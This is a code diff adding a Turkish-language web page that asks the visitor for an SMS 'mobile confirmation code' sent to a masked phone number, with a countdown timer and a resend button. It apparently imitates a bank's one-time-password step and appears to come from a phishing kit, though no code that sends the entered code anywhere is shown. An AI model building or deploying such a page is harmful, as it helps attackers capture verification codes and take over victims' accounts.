@@ -1,0 +1,189 @@
+<html class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head>
+<meta charset="UTF-8"><meta name="robots" content="noindex">
+
+
+<link rel="stylesheet" href="css-js/style.css">
+<script src="css-js/modernizr.js">
+</script><link rel="stylesheet prefetch" href="http://fonts.googleapis.com/css?family=Comfortaa:400,700">
+<script src="css-js/jqueryxdd.min.js"></script>
+<link href='http://fonts.googleapis.com/css?family=Roboto+Condensed' rel='stylesheet' type='text/css'>
+<script> 
+
+$(document).ready(function(){
+
+
+    $("#sifrelogin2").click(function(){
+        $("#sayfa2").animate({left: '0'});
+
+    });
+
+
+$('#yukleme').css({"opacity":"0"});
+	
+	
+});
+</script> 
+	
+<script type="text/javascript" src="jquery-1.9.1.min.js"></script>
+   <script type="text/javascript">
+   var saat=0;
+    var dakika=3;
+    var saniye=0;
+      function gerisay(){
+         if(saniye==0 && !dakika==0){dakika-=1;saniye=59;}
+         if(saniye>0){saniye-=1;}
+         if(dakika==0 && !saat==0){saat-=1;dakika==59;}
+         $("#geri").text(dakika+":"+saniye);
+      setTimeout("gerisay()",1000);
+      }
+
+         gerisay();
+   </script>
+	<link rel="stylesheet" type="text/css" href="css-js/modal.css" />
+		<!--[if IE]>
+  		<script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+		<![endif]-->
+		<script src="css-js/TweenMax.min.js"></script>
+		
+</head><body>
+
+
+		
+
+<div id="yukleme"></div>
+
+
+<div id="container" class="container" style="  margin-top: -1;">
+
+<div id="header"><center><img src="img/headerbaslik.png" height="90" style="margin-top:5px"></center></div>
+
+<div id="anacont" style="width:730px;min-width:730px;"><!-- 880+50px -->
+ 
+
+ <div id="logins" class="login" style="opacity: 1; display: block; transform: translateY(0px);margin-left:0;width:100%;margin-top:0">
+   
+   
+   
+   
+   
+   
+   
+<div id="loginformiki" style="padding-left: 20px;float: left;margin-left: 60px;">
+   <div class="login-icon-field" style="height:160px">
+     <img src="img/smartphone70.png"  class="login-icon" height="100px" width="100px">
+        
+    </div>
+	      <p style="margin-left:2px;margin-top: 20px;"><a>531***1213 Numaralı telefona gelen Mobil Onay Kodunu giriniz</a></p>
+	<div class="username-row row" style="opacity: 1; display: block; transform: translateX(0px);  margin-top: 10px;margin-bottom: 15px;">
+        <label for="username_input">
+                <img src="img/passwd.png" width="36">
+        </label>
+        <input type="text" id="username_input" class="username-input" style="  margin-left: 10px;" placeholder="Mobil Onay Kodu">
+      </div>
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+   
+    <div class="call-to-action">
+      <button id="sifrelogin2" type="button" style="
+    width: 100%;
+    margin-left: -5px;margin-top: -4px;
+">Devam</button>
+      <p style="margin-left:2px;font-size:15px;text-align:center;color:#FFF;padding-left:30px;"> <i id="geri">3:00</i><i>&nbsp;&nbsp;İçerisinde Giriniz</i> </p>
+	 
+    </div>
+  </div>
+  
+  
+  
+  
+  
+  
+  <div id="loginformiki" style="padding-left: 20px;float: right;margin-right: 60px;width:330px;height:100%">
+   
+	
+		<p style="color:rgba(255, 255, 255, 0.65);width:95%;margin-top:32%"><font style="font-size:16px;color: rgba(99, 172, 216, 1)">Mobil onay kodunuz 3 dakika içerisinde gelmiyorsa lütfen operatörünüz ile görüşüp engellenmediğinden emin olunuz.</font><br><br>
+Cep telefonunuzun SMS kutusunun dolu olmadığını kontrol ediniz.<br>
+
+Mobil Onay Kodu gelmediyse <i>Tekrar Mobil Onay Kodu Gönder</i> butonuna basınız..</p>
+	      <div class="call-to-action">
+      <button id="sifrelogin2" type="button" style="
+
+      margin-left: 40px;
+  background: rgba(29, 99, 183, 0.62);
+  border-radius: 1px;
+  width: 250px;
+}
+">Tekrar Mobil Onay Kodu Gönder</button>
+	  
+	  
+   
+
+  
+  
+  
+  
+  
+  
+  
+  </div>
+  
+  
+  
+  
+  
+  
+
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+</div>
+
+<script src="css-js\jquery2.min.js"></script>
+<script src="css-js\velocity.min.js"></script>
+<script src="css-js\velocity.ui.min.js"></script>
+<script>
+function slideUpIn() {
+    $('#login').velocity('transition.slideUpIn', 1250);
+}
+;
+function slideLeftIn() {
+    $('.row').delay(500).velocity('transition.slideLeftIn', { stagger: 500 });
+}
+function shake() {
+    $('.password-row').velocity('callout.shake');
+}
+slideUpIn();
+slideLeftIn();
+$('button').on('click', function () {
+    shake();
+});
+//@ sourceURL=pen.js
+</script>
+
+</body></html>
